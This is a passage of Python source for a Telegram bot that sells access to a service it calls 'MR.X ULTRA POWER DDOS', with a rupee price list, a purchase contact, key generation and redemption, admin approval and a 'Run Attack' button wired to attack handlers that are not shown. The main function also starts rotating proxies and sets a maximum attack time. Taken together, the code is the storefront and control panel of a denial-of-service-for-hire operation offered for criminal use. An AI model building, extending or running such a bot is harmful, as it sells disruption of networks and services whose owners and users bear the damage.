        msg = "🚀 MR.X ULTRA POWER DDOS 🚀\n\n📌 Welcome to the Bot\nRedeem a key to get access.\n\n💰 PRICE LIST:\n▫️ 1 Day    – ₹200 🔥\n▫️ 1 Week   – ₹700 🔥\n▫️ 1 Month  – ₹1500 🔥\n\n🛒 To Purchase: @MRXYTDM\n\n🎮 Use the buttons below:"
        keyboard = get_user_keyboard()
    await update.message.reply_text(msg, reply_markup=keyboard)

async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    if is_owner(user_id):
        msg = f"👤 User ID: {user_id}\n📛 Name: {user.first_name}\n\n✅ APPROVED (Owner)\n⏰ Expiry: Unlimited"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        expiry = data["admins"][str(user_id)].get("expiry", "N/A")
        days = get_time_left(expiry)
        msg = f"👤 User ID: {user_id}\n📛 Name: {user.first_name}\n\n👮 APPROVED (Admin)\n⏰ {days}"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        expiry = data["approved_users"][str(user_id)].get("expiry", "N/A")
        days = get_time_left(expiry)
        msg = f"👤 User ID: {user_id}\n📛 Name: {user.first_name}\n\n✅ APPROVED\n⏰ {days}"
        keyboard = get_approved_keyboard()
    else:
        msg = f"👤 User ID: {user_id}\n📛 Name: {user.first_name}\n\n❌ NOT APPROVED\n\nTo buy key: @MRXYTDM"
        keyboard = get_user_keyboard()
    await update.message.reply_text(msg, reply_markup=keyboard)

async def approve_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'approve'}
    await update.message.reply_text("✅ Approve User\n\nPlease send: <user_id> <days>")

async def process_approve(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: <id> <days>")
            return
        target_id = parts[0]
        days = int(parts[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        data["approved_users"][target_id] = {"expiry": expiry, "approved_by": user_id}
        save_data()
        await update.message.reply_text(f"✅ User Approved!\n\n👤 User ID: {target_id}\n📅 Duration: {days} days\n⏰ Expires: {expiry}", reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def disapprove_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'disapprove'}
    await update.message.reply_text("❌ Disapprove User\n\nPlease send the user ID:")

async def process_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        target_id = int(text.strip())
        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]
        save_data()
        await update.message.reply_text(f"❌ User Disapproved!\n\n👤 User ID: {target_id}", reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def add_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'add_admin'}
    await update.message.reply_text("👮 Add Admin\n\nPlease send: <user_id> <days>")

async def process_add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: <id> <days>")
            return
        target_id = parts[0]
        days = int(parts[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        data["admins"][target_id] = {"expiry": expiry, "added_by": user_id}
        save_data()
        await update.message.reply_text(f"👮 Admin Added!\n\n👤 User ID: {target_id}\n📅 Duration: {days} days\n⏰ Expires: {expiry}", reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def remove_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'remove_admin'}
    await update.message.reply_text("🚫 Remove Admin\n\nPlease send the user ID:")

async def process_remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        if target_id in data.get("admins", {}):
            del data["admins"][target_id]
            save_data()
            await update.message.reply_text(f"🚫 Admin Removed!\n\n👤 User ID: {target_id}", reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard())
        else:
            await update.message.reply_text(f"❌ User {target_id} is not an admin.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def gen_key_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'gen_key'}
    await update.message.reply_text("🎟️ Generate Access Key\n\nPlease send the number of days:")

async def process_gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        days = int(text.strip())
        key = generate_random_key()
        data["keys"][key] = {"days": days, "created_by": user_id, "redeemed": False, "redeemed_by": None}
        save_data()
        await update.message.reply_text(f"🎟️ Access Key Generated!\n\n🔑 Key: {key}\n📅 Valid for: {days} days\n✨ Status: Not redeemed", reply_markup=get_admin_keyboard() if is_admin(user_id) else get_owner_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    approved_count = len(data.get("approved_users", {}))
    admin_count = len(data.get("admins", {}))
    key_count = len(data.get("keys", {}))
    redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))
    msg = f"📊 System Statistics\n\n✅ Approved Users: {approved_count}\n👮 Admins: {admin_count}\n🎟️ Total Keys: {key_count}\n✓ Redeemed Keys: {redeemed_count}"
    keyboard = get_owner_keyboard() if is_owner(user_id) else get_admin_keyboard()
    await update.message.reply_text(msg, reply_markup=keyboard)

async def redeem_key_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_state[user_id] = 'awaiting_key'
    await update.message.reply_text("🎟️ Please send your key:")

async def process_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    key = text.strip()
    if key not in data.get("keys", {}):
        await update.message.reply_text("❌ Invalid key.", reply_markup=get_user_keyboard())
        del user_state[user_id]
        return
    key_data = data["keys"][key]
    if key_data.get("redeemed"):
        await update.message.reply_text("❌ This key has already been redeemed.", reply_markup=get_user_keyboard())
        del user_state[user_id]
        return
    days = key_data.get("days", 0)
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    data["approved_users"][str(user_id)] = {"expiry": expiry, "approved_by": "key"}
    data["keys"][key]["redeemed"] = True
    data["keys"][key]["redeemed_by"] = user_id
    save_data()
    await update.message.reply_text(f"🎉 Key Redeemed Successfully!\n\n✅ You now have access!\n📅 Valid for: {days} days\n⏰ Expires: {expiry}", reply_markup=get_approved_keyboard())
    del user_state[user_id]

# ==================== MESSAGE HANDLER ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    # Main menu buttons
    if text == "🔁 /start":
        await start(update, context)
        return
    if text == "🔐 Login":
        await start_login_flow(update, context)
        return
    if text == "🔍 Check Status":
        await check_status(update, context)
        return
    if text == "🔴 Logout":
        await logout_session(update, context)
        return
    if text == "⏱️ Cooldown ON/OFF":
        await toggle_cooldown(update, context)
        return
    if text == "⏲️ Set Cooldown":
        await set_user_cooldown_start(update, context)
        return
    if text == "📊 Slot Status":
        await slot_status(update, context)
        return
    if text == "🚀 Run Attack":
        await run_attack(update, context)
        return
    if text == "📊 My Status":
        await my_status(update, context)
        return
    
    # Admin/Owner management buttons
    if text == "✅ Approve User":
        await approve_user_start(update, context)
        return
    if text == "❌ Disapprove User":
        await disapprove_user_start(update, context)
        return
    if text == "👮 Add Admin":
        await add_admin_start(update, context)
        return
    if text == "🚫 Remove Admin":
        await remove_admin_start(update, context)
        return
    if text == "🎟️ Generate Key":
        await gen_key_start(update, context)
        return
    if text == "📊 View Stats":
        await show_stats(update, context)
        return
    if text == "🎟️ Redeem Key":
        await redeem_key_start(update, context)
        return
    
    # Account management buttons (Owner only)
    if text == "➕ Add Account":
        await add_account_start(update, context)
        return
    if text == "➖ Remove Account":
        await remove_account_start(update, context)
        return
    if text == "📋 List Accounts":
        await list_accounts(update, context)
        return
    if text == "🔐 Login All":
        await login_all_accounts(update, context)
        return
    if text == "🔄 Refresh Login":
        await refresh_login(update, context)
        return
    if text == "🗑️ Delete Token":
        await delete_token_only(update, context)
        return
    if text == "🧹 Clear Data":
        await clear_data_start(update, context)
        return
    
    # Handle state-based inputs
    if user_id in user_state:
        state = user_state[user_id]
        
        # Login flow states
        if isinstance(state, dict):
            if state.get('step') == 'waiting_token':
                await enter_token(update, context, text)
                return
            elif state.get('step') == 'waiting_captcha':
                await enter_captcha(update, context, text)
                return
            elif state.get('action') == 'approve':
                await process_approve(update, context, text)
                return
            elif state.get('action') == 'disapprove':
                await process_disapprove(update, context, text)
                return
            elif state.get('action') == 'add_admin':
                await process_add_admin(update, context, text)
                return
            elif state.get('action') == 'remove_admin':
                await process_remove_admin(update, context, text)
                return
            elif state.get('action') == 'gen_key':
                await process_gen_key(update, context, text)
                return
        
        # Account management states
        elif state == 'awaiting_account_token':
            await process_add_account_token(update, context, text)
            return
        elif state == 'awaiting_account_captcha':
            await process_add_account_captcha(update, context, text)
            return
        elif state == 'awaiting_remove_account':
            await process_remove_account(update, context, text)
            return
        elif state == 'awaiting_delete_token':
            await process_delete_token(update, context, text)
            return
        
        # Attack state
        elif isinstance(state, tuple) and len(state) == 4 and state[0] == 'awaiting_attack':
            await process_attack(update, context, text)
            return
        
        # Other states
        elif state == 'awaiting_key':
            await process_redeem(update, context, text)
            return
        elif state == 'awaiting_user_cooldown':
            await process_set_user_cooldown(update, context, text)
            return
        elif state == 'awaiting_clear_confirm':
            await process_clear_confirm(update, context, text)
            return

# ==================== MAIN ====================
def main():
    load_data()
    load_accounts()
    proxy_manager.start_auto_refresh()
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 MR.X ULTRA POWER DDOS BOT IS ACTIVE 🔥")
    print(f"✅ 10 Cons | Proxy: 300/hr | Max Attack: {MAX_ATTACK_TIME}s | Accounts: {len(accounts)}")
    app.run_polling()

if __name__ == '__main__':
    main()